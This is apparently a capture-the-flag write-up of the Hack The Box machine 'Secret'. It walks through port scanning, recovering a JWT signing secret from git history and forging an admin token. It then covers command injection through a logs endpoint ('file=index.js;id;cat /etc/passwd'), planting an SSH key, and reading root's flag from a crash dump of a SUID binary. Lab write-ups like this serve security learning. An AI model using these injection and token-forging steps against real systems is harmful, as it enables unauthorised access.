# HTB SECRET
![](https://i.imgur.com/wEfaZe4.png)

## ENUMARATION
### nmap scan
```bash
┌─[r00t@parrot]─[~/Downloads/htb/secret]
└──╼ $sudo nmap -sT -sC -sV -A 10.10.11.120
[sudo] password for r00t: 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-18 10:50 EAT
Nmap scan report for 10.10.11.120
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
| 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp open http nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open http Node.js (Express middleware)
|_http-title: DUMB Docs
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/18%OT=22%CT=1%CU=38344%PV=Y%DS=2%DC=T%G=Y%TM=61BD92
OS:E2%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/TCP)
HOP RTT ADDRESS
1 455.20 ms 10.10.14.1
2 456.22 ms 10.10.11.120

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.89 seconds
```
we can see we have three ports open: 22, 80, 3000.
It seems like the webserver runs from a node js application. But also, it seems like ports 80 and 3000 are running the same header.

Since port 80 runs HTTP, we must have a webpage. i looked at it and we were prompted with this page.

![](https://i.imgur.com/ik7G0H8.png)

nothing seemed interesting apart from the download button at the bottom.
We also get the same result with port 3000

We can do a further enumeration with gobuster to scan for available directories
```
┌─[r00t@parrot]─[~/Downloads/htb/secret]
└──╼ $gobuster dir -u 10.10.11.120 -w /usr/share/wordlists/dirb/big.txt -t 30
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url: http://10.10.11.120
[+] Threads: 30
[+] Wordlist: /usr/share/wordlists/dirb/big.txt
[+] Status codes: 200,204,301,302,307,401,403
[+] User Agent: gobuster/3.0.1
[+] Timeout: 10s
===============================================================
2021/12/18 11:14:29 Starting gobuster
===============================================================
/api (Status: 200)
/assets (Status: 301)
/docs (Status: 200)
/download (Status: 301)
===============================================================
2021/12/18 11:18:47 Finished
===============================================================
```

As we can see we have four main endpoints. I tried to look into them. The download path seemed not to be working. I had to go back to the home page at port 3000 and look at the download button.
clicking on it, we download a zip file.
### Enum source code
After unziping it, we find it contains a folder with the sites source code
```bash
┌─[r00t@parrot]─[~/Downloads/htb/secret/local-web]
└──╼ $ls -la
total 84
drwxr-xr-x 1 r00t r00t 182 Sep 3 08:57 .
drwxr-xr-x 1 r00t r00t 62 Dec 18 11:27 ..
-rw-r--r-- 1 r00t r00t 72 Sep 3 08:59 .env
drwxr-xr-x 1 r00t r00t 144 Sep 8 21:33 .git
-rw-r--r-- 1 r00t r00t 885 Sep 3 08:56 index.js
drwxr-xr-x 1 r00t r00t 14 Aug 13 07:42 model
drwxr-xr-x 1 r00t r00t 4158 Aug 13 07:42 node_modules
-rw-r--r-- 1 r00t r00t 491 Aug 13 07:42 package.json
-rw-r--r-- 1 r00t r00t 69452 Aug 13 07:42 package-lock.json
drwxr-xr-x 1 r00t r00t 20 Sep 3 08:54 public
drwxr-xr-x 1 r00t r00t 80 Sep 3 09:32 routes
drwxr-xr-x 1 r00t r00t 22 Aug 13 07:42 src
-rw-r--r-- 1 r00t r00t 651 Aug 13 07:42 validations.js
```
The next move is to inspect each and all of these source codes. 
I happened to notice this one file at ```routes/verifytoken.js``` this was after almost losing hope. I noticed that it seems to look at a JSON web token algorithm (JWT) which is not specified. This shows a possibility of modifying it and using a none algorithm to bypass validation.

I also inspected the ```/routes/auth.js``` and i noticed there is a user registration endpoint. It seemed to be using POST requests and the GET requests were not allowed.
I decided to test it with curl and see if iit was valid. Here](https://gist.github.com/subfuzion/08c5d85437d5d4f00e58) 
```BASH
┌─[r00t@parrot]─[~/Downloads/htb/secret]
└──╼ $curl -X POST -H 'Content-Type: application/json' -v http://secret.htb/api/user/register --data '{"foo": "bar"}'
Note: Unnecessary use of -X or --request, POST is already inferred.
* Trying 10.10.11.120:80...
* TCP_NODELAY set
* Connected to secret.htb (10.10.11.120) port 80 (#0)
> POST /api/user/register HTTP/1.1
> Host: secret.htb
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 14
> 
* upload completely sent off: 14 out of 14 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 400 Bad Request
< Server: nginx/1.18.0 (Ubuntu)
< Date: Sat, 18 Dec 2021 09:53:41 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 18
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/"12-FCVaNPnXYf0hIGYsTUTYByRq5/U"
< 
* Connection #0 to host secret.htb left intact
"name" is required
```

So lets look around and see what is expected of us to register a new user since we now know that we have an active register endpoint.
Looking back to the ```validation.js``` we see that we have to provide a name, email,password to register a user.

```javascript=
const Joi = require('@hapi/joi')


// register validation 

const registerValidation = data =>{
const schema = {
name: Joi.string().min(6).required(),
email: Joi.string().min(6).required().email(),
password: Joi.string().min(6).required()
};

return Joi.validate(data, schema)
}

// login validation

const loginValidation = data => {
const schema2 = {
email: Joi.string().min(6).required().email(),
password: Joi.string().min(6).required()
};

return Joi.validate(data, schema2)
}


module.exports.registerValidation = registerValidation
module.exports.loginValidation = loginValidation
```
Also if we can remember, in the website on the API documentation, we had a register user module

![](https://i.imgur.com/KLPEgAy.png)

With all this info in place, we can come up with an attack plan that will enable us to get an RCE to the machine.
our attack plan will be:
* Create a new low-level user on the system.
* Modify the JWT to be the admin
* Access restricted endpoints
These restricted endpoints, are specified in the API documentation eg the ```/api/priv``` route, which when we try accessing, we get ```Access denied```
![](https://i.imgur.com/Olux1c4.png)
## Abusing the API
### Creating a new user.
Looking at the documentation under the user registration, we can see that the user email must contain ```@dasith.works``` to be valid.
```
┌─[✗]─[r00t@parrot]─[~/Downloads/htb/secret]
└──╼ $curl -i -X POST \
> -H 'Content-Type: application/json' \
> -d '{"name":"testuser", "email":"testuser@dasith.works", "password":"testing123"}' \
> http://10.10.11.120/api/user/register
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 18 Dec 2021 10:52:23 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 19
Connection: keep-alive
X-Powered-By: Express
ETag: W/"13-DRVe0zLZCaZWlWTdrfBu0+1b9f4"

{"user":"testuser"}
```
we can see that we have successfuly created a user ```testuser```. Now its time to login and try locate our JWT validation and modify it.

```
┌─[r00t@parrot]─[~/Downloads/htb/secret]
└──╼ $curl -i -X POST -H 'Content-Type: application/json' -d '{"email":"testuser@dasith.works", "password":"testing123"}' http://10.10.11.120/api/user/login
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 18 Dec 2021 11:10:12 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 216
Connection: keep-alive
X-Powered-By: Express
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJkYmQ2N2RiZGE1MjA0NjgwNDFiNzIiLCJuYW1lIjoidGVzdHVzZXIiLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTYzOTgyNTgxMn0.SL6SIE1fbWwu7i1Py0aCHCwZESwQvofoyg6SoeoflsI
ETag: W/"d8-1FM8RUhJqjPvSAQlmqBbGwRLvlI"

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJkYmQ2N2RiZGE1MjA0NjgwNDFiNzIiLCJuYW1lIjoidGVzdHVzZXIiLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTYzOTgyNTgxMn0.SL6SIE1fbWwu7i1Py0aCHCwZESwQvofoyg6SoeoflsI
```
Now as you can see, we are successfully logged in. So let us take our jwt and try decoding it using [jwt.io](https://jwt.io/).

![](https://i.imgur.com/UJhkGj6.png)

So I decided to use the ```none``` alg technique. I tried with ```none```, ```NONE``` and ```None``` but they didn't seem to work.


---
With this technique failing, I had to think of another way. After a long time of research, I figured out that there were two hidden files in the download folder ```.env``` and ```.git```. It just came to my mind that there must be something interesting there since even the challenge name is ```secret```.

---
I started with the ```.git``` by looking at the history by running ```git log``` command.
```
┌─[r00t@parrot]─[~/Downloads/htb/secret/local-web/.git]
└──╼ $git log
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
Author: dasithsv <dasithsv@gmail.com>
Date: Thu Sep 9 00:03:27 2021 +0530

now we can view logs from the server 😃

commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date: Fri Sep 3 11:30:17 2021 +0530

removed .env for security reasons

commit de0a46b5107a2f4d26e348303e76d85ae4870934
Author: dasithsv <dasithsv@gmail.com>
Date: Fri Sep 3 11:29:19 2021 +0530

added /downloads

commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
Author: dasithsv <dasithsv@gmail.com>
Date: Fri Sep 3 11:27:35 2021 +0530

removed swap

commit 3a367e735ee76569664bf7754eaaade7c735d702
Author: dasithsv <dasithsv@gmail.com>
Date: Fri Sep 3 11:26:39 2021 +0530

added downloads

commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
Author: dasithsv <dasithsv@gmail.com>
Date: Fri Sep 3 11:25:52 2021 +0530

first commit
```
I realized an interesting commit message:
> removed .env for security reasons

So I was interested to know what was happening. I went back to the working try and decided to view information of this commit ```git diff HEAD~2```

![](https://i.imgur.com/Djs2pg9.png)

I tried using this by going back to jwt.io and changing the username to ```theadmin``` and testing the generated JWT against ```/api/priv``` endpoint, to verify if the bypass worked.

Yeet it worked.


---
Now with access to the admin page, we can use it to look at the ```/api/logs``` endpoint and gain access to the server.
## Obtaining a foothold
We can chain several bash commands like ```id``` to know the user running the application, ```/etc/passwd``` in order to obtain the user passwords and ```file``` in order curl to accept Get parameter. So the URL will look like this : ```10.10.11.120/api/logs?file=index.js;id;cat+ /etc/ passwd```

```
┌─[r00t@parrot]─[~/Downloads/htb/secret/jwt_tool]
└──╼ $curl -i \
> -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTdlMjgxZWU2N2QzZTA4NTMzOGEzZjYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3R1c2VyQGRhc2l0aC53b3JrcyIsImlhdCI6MTYzNTY1Nzg1N30.SZzvY3RD0x763smkiImsSs6WKMMMxjfr9mMOslRNGzY' \
> 'http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd' | sed 's/\\n/\n/g'
```
This was successful since it dumped all the info we wanted. Now it's time to utilize port 22 and ssh to the machine.

### Exploitation
We can generate a new ssh key which we will use to login into the machine and avoid using our main ssh key.
```ssh-keygen -t rsa -b 4096 -C 'drt@htb' -f secret.htb -P ''```

![](https://i.imgur.com/2lST9RU.png)

As we can see, in my case I had another key that I have overwritten. This was created when I first tried solving this machine.
The command generates a new SSH public and private key in the current directory named secret.htb.

To ensure that the public key is added, we can use these commands in a root shell.
* ```mkdir -p /home/dasith/.ssh```
* ``` echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys```

Now we can store the content of our public key in a variable for easy adding.
```export PUBLIC_KEY=$(cat secret.htb.pub)```
So now we can execute our last curl command to add our keys to the server for easy SSH.

![](https://i.imgur.com/WCN3P0c.png)

We received a 200 OK, meaning it worked. Yaay
### Gaining user
Now we can SSH to the machine and get that user hash

![](https://i.imgur.com/woKANty.png)

Now it's time to root this machine.

### Privilege Escalation
Trying linpeas and linEnum, they failed, so i tried exploiting SUID binaries ```find / -type f -perm -u=s 2>/dev/null```.
We find this interesting file ```/opt/count```. looking at the dir, we find that we are also provided with a source code.
```
dasith@secret:/opt$ ls -la
total 56
drwxr-xr-x 2 root root 4096 Oct 7 10:06 .
drwxr-xr-x 20 root root 4096 Oct 7 15:01 ..
-rw-r--r-- 1 root root 3736 Oct 7 10:01 code.c
-rw-r--r-- 1 root root 16384 Oct 7 10:01 .code.c.swp
-rwsr-xr-x 1 root root 17824 Oct 7 10:03 count
-rw-r--r-- 1 root root 4622 Oct 7 10:04 valgrind.log
```
Looking at the binary with some dynamic analysis, we see that when run, it asks for a directory name and displays the content in it. So I provided it with /root/root.txt as shown below

![](https://i.imgur.com/5DnBoB7.png)

I decide to crash the program and try to read the crash file which most of the time is saved in /var/crash in Linux distro. May it will display the content of the file in /root/root.txt.Reference [here](https://linux-audit.com/understand-and-configure-core-dumps-work-on-linux/). Let's GO!!!

![](https://i.imgur.com/zTZS8Zu.png)

It's now time we look at the /var/crash dir and see what we got.
we use the ```apport-unpack``` command to unpack and dump the content of the crash file in the /tmp/crash-report directory.

![](https://i.imgur.com/5hmwpJQ.png)

### Getting root
We can use strings to see the contents in CoreDump where we believe that our root hash is. Taking a close look, we find our root hash in the strings results. I'll exclude it in the screenshot.

![](https://i.imgur.com/I8QWrvO.png)

we submit the hash and 

![](https://i.imgur.com/uKOK48b.png)
yaay!!!
